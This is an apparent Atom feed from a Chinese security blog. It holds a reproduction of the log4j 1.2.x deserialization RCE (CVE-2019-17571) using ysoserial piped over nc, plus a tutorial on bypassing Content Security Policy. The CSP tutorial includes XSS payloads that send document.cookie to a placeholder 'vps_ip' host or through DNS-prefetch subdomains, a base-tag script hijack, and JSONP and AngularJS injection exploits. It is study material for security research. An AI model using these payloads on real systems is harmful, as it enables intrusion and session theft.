<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SuNu11&#39;Blog</title>
  
  <subtitle>记录分享学习生活</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sunu11.com/"/>
  <updated>2019-12-26T03:26:50.129Z</updated>
  <id>http://sunu11.com/</id>
  
  <author>
    <name>SuNu11</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>log4j小于1.2.17 Deserialization vulnerability</title>
    <link href="http://sunu11.com/2019/12/26/log4j%E5%B0%8F%E4%BA%8E1.2.17%20Deserialization%20vulnerability/"/>
    <id>http://sunu11.com/2019/12/26/log4j小于1.2.17 Deserialization vulnerability/</id>
    <published>2019-12-26T01:36:25.000Z</published>
    <updated>2019-12-26T03:26:50.129Z</updated>
    
    <content type="html"><![CDATA[<p><strong>PS: 文章仅用于研究漏洞原理,学习技术,禁止用于非法用途，否则后果自负!!!</strong></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Apache Log4j是美国阿帕奇（Apache）软件基金会的一款基于Java的开源日志记录工具。本次出现漏洞就是因为log4j在启动套接口服务器后，对监听端口传入的反序列化数据没有进行过滤而造成的。<a id="more"></a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>当log4j启动套接字服务器时，会监听命令行传入的端口。然后创建一个SocketNode类的对象来对端口接收到的数据进行处理。<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/log4jrce/CVE-2019-17571-1.png" alt="CVE-2019-17571-1"><br>在对象初始化时,将端口接收到的数据封装为一个Object流对象。在run()方法中直接调用readObject()进行反序列化操作。<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/log4jrce/CVE-2019-17571-2.png" alt="CVE-2019-17571-2"><br>因此只要运行的log4j有可以利用的Gadget就可以执行命令了。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>下载<span class="exturl" data-url="aHR0cHM6Ly9yZXBvMS5tYXZlbi5vcmcvbWF2ZW4yL2NvbW1vbnMtY29sbGVjdGlvbnMvY29tbW9ucy1jb2xsZWN0aW9ucy8zLjEvY29tbW9ucy1jb2xsZWN0aW9ucy0zLjEuamFy" title="https://repo1.maven.org/maven2/commons-collections/commons-collections/3.1/commons-collections-3.1.jar">commons-collections-3.1.jar<i class="fa fa-external-link"></i></span>,<span class="exturl" data-url="aHR0cDovL21pcnJvci5iaXQuZWR1LmNuL2FwYWNoZS9sb2dnaW5nL2xvZzRqLzEuMi4xNy9sb2c0ai0xLjIuMTcuemlw" title="http://mirror.bit.edu.cn/apache/logging/log4j/1.2.17/log4j-1.2.17.zip">log4j-1.2.17.jar<i class="fa fa-external-link"></i></span><br>将commons-collections-3.1.jar加入到log4j的classpath中,然后启动：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp &quot;log4j-1.2.17.jar:commons-collections-3.1.jar&quot; org.apache.log4j.net.SocketServer 4560 /Users/sunu11/Downloads/apache-log4j-1.2.17/examples/lf5/InitUsingLog4JProperties/log4j.properties /Users/sunu11/Downloads/apache-log4j-1.2.17</span><br></pre></td></tr></table></figure></p><p><img src="https://n-b.oss-cn-beijing.aliyuncs.com/log4jrce/CVE-2019-17571-3.png" alt="CVE-2019-17571-3"><br>然后直接使用ysoserial生成恶意序列化数据通过nc发送给4560端口即可看到漏洞触发，命令执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">▶ java -jar ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections5 &quot;curl 127.0.0.1:9900&quot; | nc 127.0.0.1 4560</span><br></pre></td></tr></table></figure></p><p><img src="https://n-b.oss-cn-beijing.aliyuncs.com/log4jrce/CVE-2019-17571-4.png" alt="CVE-2019-17571-4"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>Apache官方已在新版本修复了该漏洞，Apache Log4j 1.2 版本官方已于2015年8月停止维护，建议升级到 2.8.2 或更高<span class="exturl" data-url="aHR0cDovL2xvZ2dpbmcuYXBhY2hlLm9yZy9sb2c0ai8yLngvaW5kZXguaHRtbA==" title="http://logging.apache.org/log4j/2.x/index.html">版本<i class="fa fa-external-link"></i></span></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUkx2dnpLYkJ3S3AtV2FyOThwdm45dw==" title="https://mp.weixin.qq.com/s/RLvvzKbBwKp-War98pvn9w">https://mp.weixin.qq.com/s/RLvvzKbBwKp-War98pvn9w<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvb2tVMnkwaXpmbktYWHRYRzNFZkxrUQ==" title="https://mp.weixin.qq.com/s/okU2y0izfnKXXtXG3EfLkQ">https://mp.weixin.qq.com/s/okU2y0izfnKXXtXG3EfLkQ<i class="fa fa-external-link"></i></span><br>感谢c0ny1大佬与清水川崎大佬指点</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;PS: 文章仅用于研究漏洞原理,学习技术,禁止用于非法用途，否则后果自负!!!&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Apache Log4j是美国阿帕奇（Apache）软件基金会的一款基于Java的开源日志记录工具。本次出现漏洞就是因为log4j在启动套接口服务器后，对监听端口传入的反序列化数据没有进行过滤而造成的。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CVE-2019-17571" scheme="http://sunu11.com/tags/CVE-2019-17571/"/>
    
  </entry>
  
  <entry>
    <title>learning_CSP</title>
    <link href="http://sunu11.com/2019/12/13/learning-CSP/"/>
    <id>http://sunu11.com/2019/12/13/learning-CSP/</id>
    <published>2019-12-13T00:45:05.000Z</published>
    <updated>2019-12-13T02:46:34.676Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于最近被问到CSP绕过的一些技巧，平时虽然在XSS漏洞挖掘、jsonp劫持漏洞挖掘中也有所接触，但感觉不够清晰，因此从头学习一波。希望大家也能通过本文有所了解。在挖洞遇到CSP策略拦截的时候能够参考绕过。<a id="more"></a></p><h2 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP"></a>什么是CSP</h2><p>CSP全称Content Security Policy ,可以直接翻译为内容安全策略,就是为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程资源）。<br>举个例子：<br>我们经常可以在http头中看到下面头信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; www.sunu11.com; script-src &apos;unsafe-inline&apos;</span><br></pre></td></tr></table></figure></p><p>或者在页面中看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos; www.sunu11.com; script-src &apos;unsafe-inline&apos;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>这两种表达的含义一致，代表了默认信任同源和<code>www.sunu11.com</code>的资源,页面中允许执行javascript，允许使用内联资源如<code>&lt;script&gt;</code>标签、事件监听函数。它通过两组策略进行规定，每组策略包含一个策略指令和一个内容源列表</p><p>那下面简单介绍一下常用的<strong>策略指令</strong>：<br>default-src<br>default-src 指令定义了那些没有被更精确指令指定的安全策略。这些指令包括：</p><blockquote><ul><li>child-src      指定定义了 web workers 以及嵌套的浏览上下文（如<code>&lt;frame&gt;</code>和<code>&lt;iframe&gt;</code>）的源    </li><li>connect-src  定义了请求、XMLHttpRequest、WebSocket 和 EventSource 的连接来源</li><li>font-src         定义了字体加载的有效来源</li><li>img-src         定义了图片或者图标加载的有效来源</li><li>media-src     定义了媒体文件加载的有效来源如HTML6的 <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code>等元素</li><li>object-src     定义页面插件的过滤策略,如 <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>或者<code>&lt;applet&gt;</code>等元素</li><li>script-src      定义页面中javascript有效来源，它可以设置一些特殊值，如nonce（每次http回应给出一个授权token并内嵌脚本必须有token才会被执行）、hash（列出允许执行的脚本代码的hash值，在hash相吻合下才能执行内嵌脚本）</li><li>style-src        定义页面中CSS样式的有效来源</li></ul></blockquote><p>那啥是<strong>内容源</strong>呢：<br>内容源分三种：源列表、关键字与数据<br><strong>源列表</strong>是一个字符串,主要是指定主机或者域名，包括对应端口。可以用*来代表通配符：<br>如：</p><blockquote><ul><li>http://*.sunu11.com</li><li>sunu11.com:8080</li><li><span class="exturl" data-url="aHR0cHM6Ly92cG4uc3VudTExLmNvbQ==" title="https://vpn.sunu11.com">https://vpn.sunu11.com<i class="fa fa-external-link"></i></span></li></ul></blockquote><p>关键字主要有以下几个：</p><blockquote><ul><li>‘none’       空，不匹配任何URL</li><li>‘self’       代表与文档同源，包括相同的URL协议和端口号。</li><li>‘unsafe-inline’    允许使用内联资源（javascript:URL、内联的事件处理函数与<code>&lt;style&gt;、&lt;script&gt;</code>元素），</li><li>‘unsafe-eval’        允许使用eval()等通过字符串创建代理的方法</li></ul></blockquote><p><code>使用 &#39;unsafe-inline&#39; 和 &#39;unsafe-eval&#39; 都是不安全的，它们会导致网站有跨站脚本攻击风险。</code></p><p>数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data:</span><br><span class="line">    允许data:URL作为内容来源</span><br><span class="line">mediastream: </span><br><span class="line">    允许mediastream:URL作为内容来源</span><br></pre></td></tr></table></figure></p><h2 id="如何绕过CSP限制"><a href="#如何绕过CSP限制" class="headerlink" title="如何绕过CSP限制"></a>如何绕过CSP限制</h2><p>下面总结了一些可能遇到CSP策略后bypass的方法：</p><h3 id="可控的CRLF漏洞点"><a href="#可控的CRLF漏洞点" class="headerlink" title="可控的CRLF漏洞点"></a>可控的CRLF漏洞点</h3><p>当存在CRLF漏洞，且可控点在csp上方，可以通过注入回车换行符将CSP策略挤到返回体body部分，使其失效。注入成功后，可看到回显如下图所示：<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_1.png" alt="learning_csp_1"></p><h3 id="iframe绕过"><a href="#iframe绕过" class="headerlink" title="iframe绕过"></a>iframe绕过</h3><p>当同源站点同时存在多个页面，可以利用没有CSP保护页面的XSS漏洞窃取被保护页面的数据：<br>比如A页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;self&apos;&quot;&gt;</span><br><span class="line">&lt;h1 test=“foo”&gt;A测试页面&lt;/h1&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>B页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;var iframe = document.createElement(‘iframe’);</span><br><span class="line">iframe.src=&quot;A页面&quot;;</span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&apos;foo&apos;).innerHTML),1000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- 模拟XSS获取A页面的foo,使用setTimeout是需要等待iframe加载完A页面--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>当我们访问到B页面即可看到A测试页面被打印。</p><h3 id="使用location-href"><a href="#使用location-href" class="headerlink" title="使用location.href"></a>使用location.href</h3><p>由于CSP不会影响location.href跳转，我们可以通过构造运行如下js，将需要的数据打回vps上：<br><code>location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</code><br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_2.png" alt="learning_csp_2"></p><h3 id="link标签"><a href="#link标签" class="headerlink" title="link标签"></a>link标签</h3><p>此方法在老版本浏览器中可行，包括我们手里的xss_fuzz的字典应该也有很多使用link带外数据的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);</span><br><span class="line">document.head.appendChild(link);</span><br></pre></td></tr></table></figure></p><p>也有一种方法是将cookie作为子域名，用dns通道将cookie带出去。<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    dcl = document.cookie.split(&quot;;&quot;);</span><br><span class="line">    n0 = document.getElementsByTagName(&quot;HEAD&quot;)[0];</span><br><span class="line">    for (var i=0; i&lt;dcl.length;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        console.log(dcl[i]);</span><br><span class="line">        n0.innerHTML = n0.innerHTML + &quot;&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//&quot; + escape(dcl[i].replace(///g, &quot;-&quot;)).replace(/%/g, &quot;_&quot;) + &apos;.&apos; + location.hostname.replace(/./g, &quot;-&quot;) +  &quot;.xxx.ceye.io&quot;&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p><em>这里要考虑到域名的命名规则是 <code>[.-a-zA-Z0-9]+</code>，所以需要对一些特殊字符进行替换,然后用ceye平台查看记录，替换特殊字符即可。</em></p><h3 id="SVG绕过"><a href="#SVG绕过" class="headerlink" title="SVG绕过"></a>SVG绕过</h3><p>由于svg标签可以执行javascript脚本，如果页面中存在上传功能，并且没有过滤svg，那么可以通过上传恶意svg图像来xss.我们可以构造一个SVG文件，比如测试a.svg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_3.png" alt="learning_csp_3"></p><h3 id="Base-uri绕过"><a href="#Base-uri绕过" class="headerlink" title="Base-uri绕过"></a>Base-uri绕过</h3><p>当服务器CSP策略script-src设置了nonce时，如果只设置了default-src没有额外设置base-uri。就可以使用<code>&lt;base&gt;</code>标签使当前页面上下文为自己vps地址。如果页面中script标签采用了相对路径，最终加载的js就是针对base标签中指定url的相对路径.<br>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-test&apos;&quot;&gt;</span><br><span class="line">&lt;base href=&quot;//vps_ip:prot/&quot;&gt;</span><br><span class="line">&lt;script nonce=&apos;test&apos; src=&quot;2.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>我这边2.js没写内容，但可以看到成功引入。<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_4.png" alt="learning_csp_4"><br><em>此方法仅限页面引用存在相对路径的<code>&lt;script&gt;</code>标签以及上述两个条件。</em></p><h3 id="JSONP绕过CSP"><a href="#JSONP绕过CSP" class="headerlink" title="JSONP绕过CSP"></a>JSONP绕过CSP</h3><p>在回调函数中包装js对象的jsonp接口通常允许第三方域的脚本作为源数据来加载api数据<br>例如<code>&lt;CSP设置为default-src &#39;self&#39; ，且存在json_data.php存在可控jsonp&gt;</code><br>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;self&apos; script-src &apos;self&apos; &quot;);</span><br><span class="line">echo $_GET[&apos;foo&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>json_data.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&apos;password&apos;,&apos;1qaz@WSX&apos;);</span><br><span class="line">header(&apos;Content-type: application/javascript&apos;);</span><br><span class="line">$callback = $_GET[&apos;callback&apos;];</span><br><span class="line">$data = &quot;&#123;&apos;name&apos;:&apos;sunu11&apos;&#125;&quot;;</span><br><span class="line">echo $callback . &quot;(&quot; . json_encode($data) . &quot;)&quot;;</span><br></pre></td></tr></table></figure></p><p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/test.php?foo=%3Cscript%20src=%22http://127.0.0.1:8080/json_data.php?callback=alert(document.cookie)%22%20%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p><p><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_5.png" alt="learning_csp_5"><br>另外一些存在用户可控资源或jsonp较常用站点的github项目：<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9jc3AtZXZhbHVhdG9yL2Jsb2IvbWFzdGVyL3doaXRlbGlzdF9ieXBhc3Nlcy9qc29ucC5qcyNMMzItTDE4MA==" title="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180<i class="fa fa-external-link"></i></span></p><h3 id="利用浏览器补全绕过nonce："><a href="#利用浏览器补全绕过nonce：" class="headerlink" title="利用浏览器补全绕过nonce："></a>利用浏览器补全绕过nonce：</h3><p>如果存在CSP策略需要绕过进行XSS：<br><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;nonce-foo&#39;&quot;&gt;</code></p><p>我们测试代码如下: <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;X-XSS-Protection:0&quot;);?&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;nonce-foo&apos;&quot;&gt;</span><br><span class="line">&lt;?php echo $_GET[&apos;foo&apos;]?&gt;</span><br><span class="line">&lt;script nonce=&apos;foo&apos;&gt;</span><br><span class="line">&lt;!-- test --&gt;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>由于CSP 配置有nonce-foo，且在接受foo穿参后就有nonce=‘foo’，因此考虑插入<code>&lt;script src=data:text/php,alert(1),让&lt;script nonce=&#39;foo&#39;&gt;</code>前面的&lt;不被解析，而利用页面原有的<code>nonce=&#39;foo’</code>进行绕过。xss语句可构造为：<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_6.png" alt="learning_csp_6"></p><h3 id="CDN-bypass"><a href="#CDN-bypass" class="headerlink" title="CDN bypass"></a>CDN bypass</h3><p>在oragne大佬挖掘HackMD所存在的xss过程中，绕过CSP时发现HackMD给出的CSP信任名单有一个<code>https://cdnjs.cloudflare.com/</code>,这个cdn提供了许多第三方示例库以供引入，因此可以通过AngularJS的模板注入引入js。<br>Exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure></p><p>具体分析文章可以参考:<br><span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzg1NS8=" title="https://paper.seebug.org/855/">https://paper.seebug.org/855/<i class="fa fa-external-link"></i></span></p><h3 id="可控静态资源"><a href="#可控静态资源" class="headerlink" title="可控静态资源"></a>可控静态资源</h3><p>如果站点存在CSP策略限制，但受限站点有可控的静态资源，我们可以利用可控的静态资源来完成。<br>例如K1tten在 Review CodiMD 的Repo后发现的一处stored xss漏洞，也具有CSP限制。但他们通过找到<code>www.google-analytics.com</code>中提供的自定义javascript功能，再加上CSP 策略在同时有<code>www.google-analytics.com</code>以及 unsafe-eval这样的配置下可以执行任意JavaScript。因此可以绕过CSP的限制执行xss。<br>具体过程可以参考K1tten的wp:<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2sxdHRlbi93cml0ZXVwcy9ibG9iL21hc3Rlci9idWdib3VudHlfd3JpdGV1cC9IYWNrTURfWFNTXyUyNl9CeXBhc3NfQ1NQLm1k" title="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md">https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md<i class="fa fa-external-link"></i></span></p><h3 id="使用PDFxss绕过object-src"><a href="#使用PDFxss绕过object-src" class="headerlink" title="使用PDFxss绕过object-src"></a>使用PDFxss绕过object-src</h3><p>在CSP标准里，object-src是限制插件的src，但js并不受限制。因此我们也可以尝试通过提交pdf文件来引入js，导致客户端的弹窗与URL跳转。<br><code>&lt;embed width=&quot;100%&quot; height=&quot;100%&quot; src=&quot;//vps_ip/xxx.pdf&quot;&gt;&lt;/embed&gt;</code><br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/learning_csp/learning_csp_7.png" alt="learning_csp_7"></p><h2 id="补充总结"><a href="#补充总结" class="headerlink" title="补充总结"></a>补充总结</h2><p>考虑到上述多次提到同源策略，最后补充一下啥是同源策略：<br>同源策略是浏览器的一个安全功能，不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。<br>那什么是同源呢：<br>端口相同、域名相同、协议相同的站点就是同源站点。<br>举个例子：<br>相对我的站点：<br><code>http://sunu11.com/foo/foo.php</code><br>以下站点是否同源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://sunu11.com/foo/foo.php    不同源      </span><br><span class="line">http://sunu11.com:8080/foo/foo.php 不同源</span><br><span class="line">http://vpn.sunu11.com/foo/foo.php  不同源</span><br><span class="line">http://sunu11.com/foo/foo.php   同源</span><br></pre></td></tr></table></figure></p><p>最后贴上重学CSP所参考的一些文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly9pbnNpZGUucGl4aXYuYmxvZy9rb2JvLzUxMzc=" title="https://inside.pixiv.blog/kobo/5137">https://inside.pixiv.blog/kobo/5137<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cubmNjZ3JvdXAudHJ1c3QvdXMvYWJvdXQtdXMvbmV3c3Jvb20tYW5kLWV2ZW50cy9ibG9nLzIwMTkvYXByaWwvYS1ub3ZlbC1jc3AtYnlwYXNzLXVzaW5nLWRhdGEtdXJpLw==" title="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2019/april/a-novel-csp-bypass-using-data-uri/">https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2019/april/a-novel-csp-bypass-using-data-uri/<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvU2VjdXJpdHkvQ1NQL0NTUF9wb2xpY3lfZGlyZWN0aXZlcw==" title="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives">https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives<i class="fa fa-external-link"></i></span></p><p>内容比较基础，文中有描述错误欢迎斧正，有更好案例的希望能够py。感谢浏览至此。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;由于最近被问到CSP绕过的一些技巧，平时虽然在XSS漏洞挖掘、jsonp劫持漏洞挖掘中也有所接触，但感觉不够清晰，因此从头学习一波。希望大家也能通过本文有所了解。在挖洞遇到CSP策略拦截的时候能够参考绕过。
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="前端安全" scheme="http://sunu11.com/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="CSP" scheme="http://sunu11.com/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>免杀</title>
    <link href="http://sunu11.com/2019/09/05/Trojans_avoid_killing/"/>
    <id>http://sunu11.com/2019/09/05/Trojans_avoid_killing/</id>
    <published>2019-09-05T08:10:19.000Z</published>
    <updated>2019-09-05T08:10:19.110Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>参考文章</title>
    <link href="http://sunu11.com/2019/09/03/papers/"/>
    <id>http://sunu11.com/2019/09/03/papers/</id>
    <published>2019-09-03T02:45:59.000Z</published>
    <updated>2019-12-13T00:49:10.821Z</updated>
    
    <content type="html"><![CDATA[<p>本文章记录看到的有价值的文章，可供自己查阅以及参考。感谢作者！！<a id="more"></a></p><h2 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h2><p>常见未授权访问漏洞总结(小维)：<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjEwMw==" title="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文章记录看到的有价值的文章，可供自己查阅以及参考。感谢作者！！
    
    </summary>
    
      <category term="other" scheme="http://sunu11.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>windows下命令执行</title>
    <link href="http://sunu11.com/2019/09/02/Command%20execution%20under%20windows/"/>
    <id>http://sunu11.com/2019/09/02/Command execution under windows/</id>
    <published>2019-09-02T08:39:12.000Z</published>
    <updated>2019-09-12T07:02:37.057Z</updated>
    
